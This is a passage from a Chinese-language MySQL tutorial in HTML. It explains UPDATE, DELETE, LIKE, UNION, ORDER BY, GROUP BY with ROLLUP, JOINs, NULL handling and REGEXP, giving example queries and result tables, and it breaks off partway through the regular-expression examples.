<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> runoob_tbl <span class="keyword">SET</span> runoob_title=<span class="string">'学习 C++'</span> <span class="keyword">WHERE</span> runoob_id=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-DELETE-语句"><a href="#MySQL-DELETE-语句" class="headerlink" title="MySQL DELETE 语句"></a>MySQL DELETE 语句</h1><p>你可以使用 SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录。</p>
<h2 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h2><p>以下是 SQL DELETE 语句从 MySQL 数据表中删除数据的通用语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name [<span class="keyword">WHERE</span> Clause]</span><br></pre></td></tr></table></figure></p>
<ol>
<li>如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。</li>
<li>你可以在 WHERE 子句中指定任何条件</li>
<li>您可以在单个表中一次性删除记录。</li>
</ol>
<p>当你想删除数据表中指定的记录时 WHERE 子句是非常有用的。</p>
<h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> runoob_tbl <span class="keyword">WHERE</span> runoob_id=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-LIKE-子句"><a href="#MySQL-LIKE-子句" class="headerlink" title="MySQL LIKE 子句"></a>MySQL LIKE 子句</h1><p>我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</p>
<p>WHERE 子句中可以使用等号 = 来设定获取数据的条件，如 “runoob_author = ‘RUNOOB.COM’”。</p>
<p>但是有时候我们需要获取 runoob_author 字段含有 “COM” 字符的所有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</p>
<p>SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号 *。</p>
<p>如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。</p>
<h2 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h2><p>以下是 SQL SELECT 语句使用 LIKE 子句从数据表中读取数据的通用语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN </span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> field1 <span class="keyword">LIKE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] filed2 = <span class="string">'somevalue'</span></span><br></pre></td></tr></table></figure></p>
<ol>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以在 WHERE 子句中使用LIKE子句。</li>
<li>你可以使用LIKE子句代替等号 =。</li>
<li>LIKE 通常与 % 一同使用，类似于一个元字符的搜索。</li>
<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
<li>你可以在 DELETE 或 UPDATE 命令中使用 WHERE…LIKE 子句来指定条件。</li>
</ol>
<h1 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl  <span class="keyword">WHERE</span> runoob_author <span class="keyword">LIKE</span> <span class="string">'%COM'</span>;</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-UNION-操作符"><a href="#MySQL-UNION-操作符" class="headerlink" title="MySQL UNION 操作符"></a>MySQL UNION 操作符</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p>
<h2 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h2><p>MySQL UNION 操作符语法格式：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> expression1, expression2, ... expression_n</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">tables</span></span><br><span class="line">[<span class="keyword">WHERE</span> conditions]</span><br><span class="line"><span class="keyword">UNION</span> [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span>]</span><br><span class="line"><span class="keyword">SELECT</span> expression1, expression2, ... expression_n</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">tables</span></span><br><span class="line">[<span class="keyword">WHERE</span> conditions];</span><br></pre></td></tr></table></figure></p>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ol>
<li>expression1, expression2, … expression_n: 要检索的列。</li>
<li>tables: 要检索的数据表。</li>
<li>WHERE conditions: 可选， 检索条件。</li>
<li>DISTINCT: 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。</li>
<li>ALL: 可选，返回所有结果集，包含重复数据。</li>
</ol>
<h2 id="SQL-UNION-实例"><a href="#SQL-UNION-实例" class="headerlink" title="SQL UNION 实例"></a>SQL UNION 实例</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>
<p>注释：UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！</p>
<h2 id="SQL-UNION-ALL-实例"><a href="#SQL-UNION-ALL-实例" class="headerlink" title="SQL UNION ALL 实例"></a>SQL UNION ALL 实例</h2><p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取所有的country（也有重复的值）：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure></p>
<h2 id="带有-WHERE-的-SQL-UNION-ALL"><a href="#带有-WHERE-的-SQL-UNION-ALL" class="headerlink" title="带有 WHERE 的 SQL UNION ALL"></a>带有 WHERE 的 SQL UNION ALL</h2><p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取所有的中国(CN)的数据（也有重复的值）：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country, <span class="keyword">name</span> <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country, app_name <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> country=<span class="string">'CN'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-排序"><a href="#MySQL-排序" class="headerlink" title="MySQL 排序"></a>MySQL 排序</h1><p>我们知道从 MySQL 表中使用 SQL SELECT 语句来读取数据。</p>
<p>如果我们需要对读取的数据进行排序，我们就可以使用 MySQL 的 ORDER BY 子句来设定你想按哪个字段哪种方式来进行排序，再返回搜索结果。</p>
<h2 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h2><p>以下是 SQL SELECT 语句使用 ORDER BY 子句将查询数据排序后再返回数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN table_name1, table_name2...</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> field1 [<span class="keyword">ASC</span> [<span class="keyword">DESC</span>][默认 <span class="keyword">ASC</span>]], [field2...] [<span class="keyword">ASC</span> [<span class="keyword">DESC</span>][默认 <span class="keyword">ASC</span>]]</span><br></pre></td></tr></table></figure>
<ol>
<li>你可以使用任何字段来作为排序的条件，从而返回排序后的查询结果。</li>
<li>你可以设定多个字段来排序。</li>
<li>你可以使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列。 默认情况下，它是按升序排列。</li>
<li>你可以添加 WHERE…LIKE 子句来设置条件。</li>
</ol>
<h2 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h2><p>尝试以下实例，结果将按升序及降序排列。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
<h1 id="MySQL-GROUP-BY-语句"><a href="#MySQL-GROUP-BY-语句" class="headerlink" title="MySQL GROUP BY 语句"></a>MySQL GROUP BY 语句</h1><p>GROUP BY 语句根据一个或多个列对结果集进行分组。<br>在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p>
<h2 id="GROUP-BY-语法"><a href="#GROUP-BY-语法" class="headerlink" title="GROUP BY 语法"></a>GROUP BY 语法</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name, <span class="keyword">function</span>(column_name)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">operator</span> <span class="keyword">value</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> column_name;</span><br></pre></td></tr></table></figure>
<h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>本章节实例使用到了以下表结构及数据，使用前我们可以先将以下数据导入数据库中。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">--  Table structure for `employee_tbl`</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`employee_tbl`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`employee_tbl`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">  <span class="string">`date`</span> datetime <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`singin`</span> <span class="built_in">tinyint</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'登录次数'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">--  Records of `employee_tbl`</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`employee_tbl`</span> <span class="keyword">VALUES</span> (<span class="string">'1'</span>, <span class="string">'小明'</span>, <span class="string">'2016-04-22 15:25:33'</span>, <span class="string">'1'</span>), (<span class="string">'2'</span>, <span class="string">'小王'</span>, <span class="string">'2016-04-20 15:25:47'</span>, <span class="string">'3'</span>), (<span class="string">'3'</span>, <span class="string">'小丽'</span>, <span class="string">'2016-04-19 15:26:02'</span>, <span class="string">'2'</span>), (<span class="string">'4'</span>, <span class="string">'小王'</span>, <span class="string">'2016-04-07 15:26:14'</span>, <span class="string">'4'</span>), (<span class="string">'5'</span>, <span class="string">'小明'</span>, <span class="string">'2016-04-11 15:26:40'</span>, <span class="string">'4'</span>), (<span class="string">'6'</span>, <span class="string">'小明'</span>, <span class="string">'2016-04-04 15:26:54'</span>, <span class="string">'2'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>接下来我们使用 GROUP BY 语句 将数据表按名字进行分组，并统计每个人有多少条记录：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM   employee_tbl GROUP BY name;</span><br><span class="line">+<span class="comment">--------+----------+</span></span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+<span class="comment">--------+----------+</span></span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+<span class="comment">--------+----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<h2 id="使用-WITH-ROLLUP"><a href="#使用-WITH-ROLLUP" class="headerlink" title="使用 WITH ROLLUP"></a>使用 WITH ROLLUP</h2><p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。<br>例如我们将以上的数据表按名字进行分组，再统计每个人登录的次数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name, SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+<span class="comment">--------+--------------+</span></span><br><span class="line">| name   | singin_count |</span><br><span class="line">+<span class="comment">--------+--------------+</span></span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+<span class="comment">--------+--------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>其中记录 NULL 表示所有人的登录次数。<br>我们可以使用 coalesce 来设置一个可以取代 NUll 的名称，coalesce 语法：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">coalesce</span>(a,b,c);</span><br></pre></td></tr></table></figure></p>
<p>参数说明：如果a==null,则选择b；如果b==null,则选择c；如果a!=null,则选择a；如果a b c 都为null ，则返回为null（没意义）。</p>
<p>以下实例中如果名字为空我们使用总数代替：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT coalesce(name, '总数'), SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+<span class="comment">--------------------------+--------------+</span></span><br><span class="line">| coalesce(name, '总数') | singin_count |</span><br><span class="line">+<span class="comment">--------------------------+--------------+</span></span><br><span class="line">| 小丽                   |            2 |</span><br><span class="line">| 小明                   |            7 |</span><br><span class="line">| 小王                   |            7 |</span><br><span class="line">| 总数                   |           16 |</span><br><span class="line">+<span class="comment">--------------------------+--------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<h1 id="Mysql-连接的使用"><a href="#Mysql-连接的使用" class="headerlink" title="Mysql 连接的使用"></a>Mysql 连接的使用</h1><p>在前几章节中，我们已经学会了如何在一张表中读取数据，这是相对简单的，但是在真正的应用中经常需要从多个数据表中读取数据。</p>
<p>本章节我们将向大家介绍如何使用 MySQL 的 JOIN 在两个或多个表中查询数据。</p>
<p>你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</p>
<p>JOIN 按照功能大致分为如下三类：</p>
<ol>
<li>INNER JOIN（内连接,或等值连接）：获取两个表中字段匹配关系的记录。</li>
<li>LEFT JOIN（左连接）：获取左表所有记录，即使右表没有对应匹配的记录。</li>
<li>RIGHT JOIN（右连接）： 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li>
</ol>
<h2 id="在命令提示符中使用-INNER-JOIN"><a href="#在命令提示符中使用-INNER-JOIN" class="headerlink" title="在命令提示符中使用 INNER JOIN"></a>在命令提示符中使用 INNER JOIN</h2><p>实例<br>尝试以下实例：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT * FROM tcount_tbl;</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| 菜鸟教程  | 10           |</span><br><span class="line">| RUNOOB.COM    | 20           |</span><br><span class="line">| Google        | 22           |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_tbl;</span><br><span class="line">+<span class="comment">-----------+---------------+---------------+-----------------+</span></span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+<span class="comment">-----------+---------------+---------------+-----------------+</span></span><br><span class="line">| 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 5         | 学习 C      | FK            | 2017-04-05      |</span><br><span class="line">+<span class="comment">-----------+---------------+---------------+-----------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>接下来我们就使用MySQL的INNER JOIN(也可以省略 INNER 使用 JOIN，效果一样)来连接以上两张表来读取runoob_tbl表中所有runoob_author字段在tcount_tbl表对应的runoob_count字段值：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>以上 SQL 语句等价于：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a, tcount_tbl b WHERE a.runoob_author = b.runoob_author;</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<h2 id="MySQL-LEFT-JOIN"><a href="#MySQL-LEFT-JOIN" class="headerlink" title="MySQL LEFT JOIN"></a>MySQL LEFT JOIN</h2><p>MySQL left join 与 join 有所不同。 MySQL LEFT JOIN 会读取左边数据表的全部数据，即便右边表无对应数据。</p>
<p>实例<br>尝试以下实例，以 runoob_tbl 为左表，tcount_tbl 为右表，理解 MySQL LEFT JOIN 的应用：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a LEFT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">| 5           | FK              | NULL           |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>以上实例中使用了 LEFT JOIN，该语句会读取左边的数据表 runoob_tbl 的所有选取的字段数据，即便在右侧表 tcount_tbl中 没有对应的 runoob_author 字段值。</p>
<h1 id="MySQL-RIGHT-JOIN"><a href="#MySQL-RIGHT-JOIN" class="headerlink" title="MySQL RIGHT JOIN"></a>MySQL RIGHT JOIN</h1><p>MySQL RIGHT JOIN 会读取右边数据表的全部数据，即便左边边表无对应数据。</p>
<p>实例<br>尝试以下实例，以 runoob_tbl 为左表，tcount_tbl 为右表，理解MySQL RIGHT JOIN的应用：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a RIGHT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">| NULL        | NULL            | 22             |</span><br><span class="line">+<span class="comment">-------------+-----------------+----------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>以上实例中使用了 RIGHT JOIN，该语句会读取右边的数据表 tcount_tbl 的所有选取的字段数据，即便在左侧表 runoob_tbl 中没有对应的runoob_author 字段值。</p>
<h1 id="MySQL-NULL-值处理"><a href="#MySQL-NULL-值处理" class="headerlink" title="MySQL NULL 值处理"></a>MySQL NULL 值处理</h1><p>我们已经知道 MySQL 使用 SQL SELECT 命令及 WHERE 子句来读取数据表中的数据,但是当提供的查询条件字段为 NULL 时，该命令可能就无法正常工作。</p>
<p>为了处理这种情况，MySQL提供了三大运算符:</p>
<ol>
<li>IS NULL: 当列的值是 NULL,此运算符返回 true。</li>
<li>IS NOT NULL: 当列的值不为 NULL, 运算符返回 true。</li>
<li>&lt;=&gt;: 比较操作符（不同于=运算符），当比较的的两个值为 NULL 时返回 true。</li>
</ol>
<p>关于 NULL 的条件比较运算是比较特殊的。你不能使用 = NULL 或 != NULL 在列中查找 NULL 值 。</p>
<p>在 MySQL 中，NULL 值与任何其它值的比较（即使是 NULL）永远返回 false，即 NULL = NULL 返回false 。</p>
<p>MySQL 中处理 NULL 使用 IS NULL 和 IS NOT NULL 运算符。</p>
<p>注意：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * , columnName1+<span class="keyword">ifnull</span>(columnName2,<span class="number">0</span>) <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<p>columnName1，columnName2 为 int 型，当 columnName2 中，有值为 null 时，columnName1+columnName2=null， ifnull(columnName2,0) 把 columnName2 中 null 值转为 0。</p>
<h2 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h2><p>尝试以下实例:<br>以下实例中你可以看到 = 和 != 运算符是不起作用的：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM runoob_test_tbl WHERE runoob_count = NULL;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> runoob_test_tbl <span class="keyword">WHERE</span> runoob_count != <span class="literal">NULL</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
<p>查找数据表中 runoob_test_tbl 列是否为 NULL，必须使用 IS NULL 和 IS NOT NULL，如下实例：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM runoob_test_tbl WHERE runoob_count IS NULL;</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| 菜鸟教程  | NULL         |</span><br><span class="line">| Google        | NULL         |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; <span class="keyword">SELECT</span> * <span class="keyword">from</span> runoob_test_tbl <span class="keyword">WHERE</span> runoob_count <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>;</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| RUNOOB        | 20           |</span><br><span class="line">| FK            | 20           |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-正则表达式"><a href="#MySQL-正则表达式" class="headerlink" title="MySQL 正则表达式"></a>MySQL 正则表达式</h1><p>在前面的章节我们已经了解到MySQL可以通过 LIKE …% 来进行模糊匹配。</p>
<p>MySQL 同样也支持其他正则表达式的匹配， MySQL中使用 REGEXP 操作符来进行正则表达式匹配。</p>
<p>如果您了解PHP或Perl，那么操作起来就非常简单，因为MySQL的正则表达式匹配与这些脚本的类似。</p>
<p>下表中的正则模式可应用于 REGEXP 操作符中。</p>
<p>模式    描述<br>^    匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。<br>$    匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。<br>.    匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用象 ‘[.\n]’ 的模式。<br>[…]    字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。<br>[^…]    负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’。<br>p1|p2|p3    匹配 p1 或 p2 或 p3。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</p>
<ul>
<li>匹配前面的子表达式零次或多次。例如，zo<em> 能匹配 “z” 以及 “zoo”。</em> 等价于{0,}。</li>
</ul>
<ul>
<li>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。<br>{n}    n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。<br>{n,m}    m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</li>
</ul>
<h1 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h1><p>了解以上的正则需求后，我们就可以根据自己的需求来编写带有正则表达式的SQL语句。以下我们将列出几个小实例(表名：person_tbl )来加深我们的理解：</p>
<p>查找name字段中以’st’为开头的所有数据：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP '^st';</span><br></pre></td></tr></table></figure></p>
<p>查找name字段中以’ok’为结尾的所有数据：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP 'ok$';</span><br></pre></td></tr></table></figure></p>
<p>查找name字段中包含’mar’字符串的所有数据：</p>
